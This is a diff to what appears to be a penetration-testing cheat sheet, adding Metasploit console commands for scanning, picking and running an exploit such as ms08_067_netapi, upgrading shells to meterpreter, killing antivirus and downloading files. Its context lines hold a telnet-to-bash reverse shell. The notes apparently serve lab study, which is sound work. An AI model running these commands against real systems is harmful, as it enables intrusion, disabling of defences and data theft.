@@ -109,3 +109,37 @@ nc -vnlp 3000
 nc -vnlp 2000
 # in client
 telnet host.ip.address 3000 | /bin/bash | telnet host.ip.address 2000
+
+## Metasploit
+msfdb init # initialize metasploit db
+msfconsole # opens metasploit console
+msfconsole -r /vagrant/scripts/connect-windows-xp.rc # uses commands used in quotes
+
+### METASPLOIT CONSOLE ###
+? # list metasploit commands
+db_status # shows database status
+db_export -f xml output.xml # export database info in xml
+db_import input.xml # import database info in xml
+hosts # show hosts information stored in db
+db_nmap -A host.ip.address
+search cve:2022 type:exploit app:client # show exploits of 2022 for client applications
+search Internet Explorer # show exploits for Internet Explorer
+grep good search ms17 # uses grep in search, in this example microsoft exploits that occurred in 2017 and are good
+info exploit/windows/smb/ms08_067_netapi # show information of exploit
+use exploit/windows/smb/ms08_067_netapi # uses exploit
+? # run again to see exploit commands
+show options # shows parameters for module work
+set VARIABLE value # set the module var value
+setg VARIABLE value # same as above but globally
+show missing #show missing vars
+exploit # execute exploit
+background # send current shell to sessions
+sessions -l # list metasploit sessions
+sessions -i 1 # reenter session 1 running in background
+session -u 1 # upgrade a shell to meterpreter in target session
+sessions -s checkvm -i 2 # checks if session shell is running in a vm
+sessions -s killav -i 2 # kills antivirus processes
+sessions -k 1 # kills selected session
+sessions -K # kills all sessions
+download # downloads file to localhost
+##########################
